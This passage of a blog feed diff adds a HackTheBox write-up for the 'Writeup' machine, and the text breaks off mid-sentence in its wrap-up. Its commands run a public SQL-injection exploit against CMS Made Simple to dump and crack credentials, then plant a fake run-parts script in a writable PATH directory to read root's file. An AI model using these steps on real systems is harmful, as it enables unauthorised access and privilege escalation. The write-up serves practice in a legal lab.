@@ -1,5 +1,190 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2019-09-29T09:00:00+02:00</updated><entry><title>HTB: Swagshop</title><link href="https://maggick.fr/2019/09/htb-swagshop.html" rel="alternate"></link><published>2019-09-29T09:00:00+02:00</published><updated>2019-09-29T09:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2019-09-29:/2019/09/htb-swagshop.html</id><summary type="html">&lt;p&gt;&lt;img alt="Swagshop Card" class="align-left" src="/media/2019.09/swagshop_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2019-10-12T21:52:00+02:00</updated><entry><title>HTB: Writeup</title><link href="https://maggick.fr/2019/10/htb-writeup.html" rel="alternate"></link><published>2019-10-12T21:52:00+02:00</published><updated>2019-10-12T21:52:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2019-10-12:/2019/10/htb-writeup.html</id><summary type="html">&lt;p&gt;&lt;img alt="Writeup Card" class="align-left" src="/media/2019.10/writeup_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/192"&gt;Writeup&lt;/a&gt;.
+(&lt;em&gt;Yes the machine name is writeup, searching a writeup for writeup will be a
+funny thing.&lt;/em&gt;).
+The machine is classed as an easy one. It involves vulnerability in a known CMS
+as well as "PATH vulnerability" for the privilege escalation.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2019.10/writeup_card.png" alt="Writeup Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/192"&gt;Writeup&lt;/a&gt;.
+(&lt;em&gt;Yes the machine name is writeup, searching a writeup for writeup will be a
+funny thing.&lt;/em&gt;).
+The machine is classed as an easy one. It involves vulnerability in a known CMS
+as well as "PATH vulnerability" for the privilege escalation.&lt;/p&gt;
+
+
+&lt;div class="toc"&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#recon"&gt;Recon&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#web-getting-user"&gt;Web, getting user&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#root"&gt;Root&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#wrapping-up"&gt;Wrapping up&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
+&lt;p&gt;First of all we start by scanning the machine's open ports with nmap. Only port
+22 (SSH) and 80 (HTTP) are open:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;# Nmap 7.80 scan initiated Sun Sep 22 16:08:28 2019 as: nmap -oA nmap -sSV 10.10.10.138&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.138&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.089s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 998 filtered ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http    Apache httpd 2.4.25 ((Debian))&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Sun Sep 22 16:08:43 2019 -- 1 IP address (1 host up) scanned in 15.20 seconds&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="web-getting-user"&gt;Web, getting user&lt;/h1&gt;
+&lt;p&gt;The homepage of this website is ugly and say that there is nothing there yet.
+We take a look to &lt;code&gt;robots.txt&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;#              __&lt;/span&gt;
+&lt;span class="code-line"&gt;#      _(\    |@@|&lt;/span&gt;
+&lt;span class="code-line"&gt;#     (__/\__ \--/ __&lt;/span&gt;
+&lt;span class="code-line"&gt;#        \___|----|  |   __&lt;/span&gt;
+&lt;span class="code-line"&gt;#            \ }{ /\ )_ / _\&lt;/span&gt;
+&lt;span class="code-line"&gt;#            /\__/\ \__O (__&lt;/span&gt;
+&lt;span class="code-line"&gt;#           (--/\--)    \__/&lt;/span&gt;
+&lt;span class="code-line"&gt;#           _)(  )(_&lt;/span&gt;
+&lt;span class="code-line"&gt;#          `---&amp;#39;&amp;#39;---`&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Disallow access to the blog until content is finished.&lt;/span&gt;
+&lt;span class="code-line"&gt;User-agent: * &lt;/span&gt;
+&lt;span class="code-line"&gt;Disallow: /writeup/&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Let's take a look at &lt;code&gt;/writeup/&lt;/code&gt;! We have there another website. When looking at
+the page source code we notice the use of "CMS Made Simple" a CMS with a few
+vulnerabilities.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt; &lt;span class="na"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;en_US&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Home - writeup&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;base&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://10.10.10.138/writeup/&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Generator&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;http-equiv&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/html; charset=utf-8&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Let's search for exploits, a few of them are available:&lt;/p&gt;
+&lt;p&gt;:::text
+    # searchsploit 'made simple'
+    -------------------------------------------------------------------------------------- ----------------------------------
+     Exploit Title                                                                        |  Path
+                                                                                          | (/usr/share/exploitdb/)
+    -------------------------------------------------------------------------------------- ----------------------------------
+    CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)    | exploits/php/remote/46627.rb
+    CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                               | exploits/php/webapps/26217.html
+    CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                               | exploits/php/webapps/26298.txt
+    CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                            | exploits/php/webapps/29272.txt
+    CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                | exploits/php/webapps/29941.txt
+    CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities               | exploits/php/webapps/32668.txt
+    CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                     | exploits/php/webapps/43889.txt
+    CMS Made Simple 1.2 - Remote Code Execution                                           | exploits/php/webapps/4442.txt
+    CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                  | exploits/php/webapps/4810.txt
+    CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                      | exploits/php/webapps/5600.php
+    CMS Made Simple 1.4.1 - Local File Inclusion                                          | exploits/php/webapps/7285.txt
+    CMS Made Simple 1.6.2 - Local File Disclosure                                         | exploits/php/webapps/9407.txt
+    CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                   | exploits/php/webapps/33643.txt
+    CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                      | exploits/php/webapps/11424.txt
+    CMS Made Simple 1.7 - Cross-Site Request Forgery                                      | exploits/php/webapps/12009.html
+    CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                         | exploits/php/webapps/34299.py
+    CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery               | exploits/php/webapps/34068.html
+    CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                      | exploits/php/webapps/41997.txt
+    CMS Made Simple 2.1.6 - Remote Code Execution                                         | exploits/php/webapps/44192.txt
+    CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                         | exploits/php/webapps/44976.py
+    CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                         | exploits/php/webapps/45793.py
+    CMS Made Simple &amp;lt; 1.12.1 / &amp;lt; 2.1.3 - Web Server Cache Poisoning                       | exploits/php/webapps/39760.txt
+    CMS Made Simple &amp;lt; 2.2.10 - SQL Injection                                              | exploits/php/webapps/46635.py
+    CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                      | exploits/php/webapps/34300.py
+    CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                 | exploits/php/webapps/34298.py
+    CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload        | exploits/php/webapps/46546.py
+    -------------------------------------------------------------------------------------- ----------------------------------
+    Shellcodes: No Result&lt;/p&gt;
+&lt;p&gt;As we are not authenticated, The one that interest us is "CMS Made Simple &amp;lt;
+2.2.10 - SQL Injection (exploits/php/webapps/46635.py). We run the exploit
+(admire the beauty of the display). We then get a username, an email, a password
+salt and a password hash.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;python 46635.py -u http://10.10.10.138/writeup&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] Salt for password found: 5a599ef579066807&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] Username found: jkr&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] Email found: jkr@writeup.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] Password found: 62def4866937f08cc13bab43bb14e6f7&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The exploit also allow to crack the password using a dictionary. We run
+"rockyou" against it and found jkr password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;# &lt;span class="nv"&gt;python&lt;/span&gt; &lt;span class="mi"&gt;46635&lt;/span&gt;.&lt;span class="nv"&gt;py&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nv"&gt;crack&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;w&lt;/span&gt; .&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;rockyou&lt;/span&gt;.&lt;span class="nv"&gt;txt&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;u&lt;/span&gt; &lt;span class="nv"&gt;http&lt;/span&gt;:&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;.&lt;span class="mi"&gt;10&lt;/span&gt;.&lt;span class="mi"&gt;10&lt;/span&gt;.&lt;span class="mi"&gt;138&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;writeup&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[&lt;span class="o"&gt;+&lt;/span&gt;] &lt;span class="nv"&gt;Salt&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;password&lt;/span&gt; &lt;span class="nv"&gt;found&lt;/span&gt;: &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nv"&gt;a599ef579066807&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[&lt;span class="o"&gt;+&lt;/span&gt;] &lt;span class="nv"&gt;Username&lt;/span&gt; &lt;span class="nv"&gt;found&lt;/span&gt;: &lt;span class="nv"&gt;jkr&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[&lt;span class="o"&gt;+&lt;/span&gt;] &lt;span class="nv"&gt;Email&lt;/span&gt; &lt;span class="nv"&gt;found&lt;/span&gt;: &lt;span class="nv"&gt;jkr&lt;/span&gt;@&lt;span class="nv"&gt;writeup&lt;/span&gt;.&lt;span class="nv"&gt;htb&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[&lt;span class="o"&gt;+&lt;/span&gt;] &lt;span class="nv"&gt;Password&lt;/span&gt; &lt;span class="nv"&gt;found&lt;/span&gt;: &lt;span class="mi"&gt;62&lt;/span&gt;&lt;span class="nv"&gt;def4866937f08cc13bab43bb14e6f7&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[&lt;span class="o"&gt;+&lt;/span&gt;] &lt;span class="nv"&gt;Password&lt;/span&gt; &lt;span class="nv"&gt;cracked&lt;/span&gt;: &lt;span class="nv"&gt;raykayjay9&lt;/span&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;With this password we are able to connect to the box using SSH and get the user
+password:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;# ssh jkr@10.10.10.138&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;jkr&lt;/span&gt;&lt;span class="mf"&gt;@10.10.10.138&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="nl"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;Linux&lt;/span&gt; &lt;span class="n"&gt;writeup&lt;/span&gt; &lt;span class="mf"&gt;4.9.0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;amd64&lt;/span&gt; &lt;span class="n"&gt;x86_64&lt;/span&gt; &lt;span class="n"&gt;GNU&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;programs&lt;/span&gt; &lt;span class="n"&gt;included&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;Devuan&lt;/span&gt; &lt;span class="n"&gt;GNU&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt; &lt;span class="n"&gt;system&lt;/span&gt; &lt;span class="n"&gt;are&lt;/span&gt; &lt;span class="n"&gt;free&lt;/span&gt; &lt;span class="n"&gt;software&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;exact&lt;/span&gt; &lt;span class="n"&gt;distribution&lt;/span&gt; &lt;span class="n"&gt;terms&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;each&lt;/span&gt; &lt;span class="n"&gt;program&lt;/span&gt; &lt;span class="n"&gt;are&lt;/span&gt; &lt;span class="n"&gt;described&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;individual&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="cm"&gt;/*/copyright.&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="cm"&gt;Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="cm"&gt;permitted by applicable law.&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="cm"&gt;Last login: Sun Sep 22 12:31:00 2019 from 10.10.14.237&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="cm"&gt;jkr@writeup:~$ cat user.txt &lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="cm"&gt;d4e493&amp;lt;redacted&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;We enumerate the box without a lot of success. A quick read of the box forum
+recommend to run &lt;a href="https://github.com/DominicBreuker/pspy"&gt;pspy&lt;/a&gt; on the box. We
+discover that a script is run every time an user connect with SSH.
+    2019/09/25 07:39:49 CMD: UID=0    PID=4352   | sshd: [accepted]
+    2019/09/25 07:39:49 CMD: UID=0    PID=4353   | sshd: [accepted]&lt;br&gt;
+    2019/09/25 07:40:01 CMD: UID=0    PID=4354   | sshd: jkr [priv]&lt;br&gt;
+    2019/09/25 07:40:01 CMD: UID=0    PID=4355   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &amp;gt; /run/motd.dynamic.new 
+    2019/09/25 07:40:01 CMD: UID=0    PID=4356   | run-parts --lsbsysinit /etc/update-motd.d &lt;/p&gt;
+&lt;p&gt;The PATH is fixed by the command line and there is no &lt;code&gt;run-parts&lt;/code&gt; binary in the
+first folder &lt;code&gt;/usr/local/sbin&lt;/code&gt;. Moreover this folder is writable. Therefore
+we write a simple file &lt;code&gt;/usr/local/sbin/run-parts&lt;/code&gt; and give it the execution
+permission:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;jkr&lt;/span&gt;&lt;span class="nv"&gt;@writeup&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;vim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sbin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;parts&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;#!&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bash&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lool&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;rm&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lool&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;jkr&lt;/span&gt;&lt;span class="nv"&gt;@writeup&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chmod&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sbin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;parts&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We create a directory in &lt;code&gt;/tmp/&lt;/code&gt; and write the &lt;code&gt;b&lt;/code&gt; file. At the same time be
+connect by SSH with the jkr user. We get the root flag&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;jkr&lt;/span&gt;&lt;span class="nv"&gt;@writeup&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mkdir&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lool&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;jkr&lt;/span&gt;&lt;span class="nv"&gt;@writeup&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lool&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;jkr&lt;/span&gt;&lt;span class="nv"&gt;@writeup&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;tail&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lool&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nl"&gt;tail&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lool&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nl"&gt;b&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;file&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;truncated&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;eeba4&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;redacted&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;The user step implied only to use a know exploit without any change. The
+privilege escalation was really interesting as I didn't use
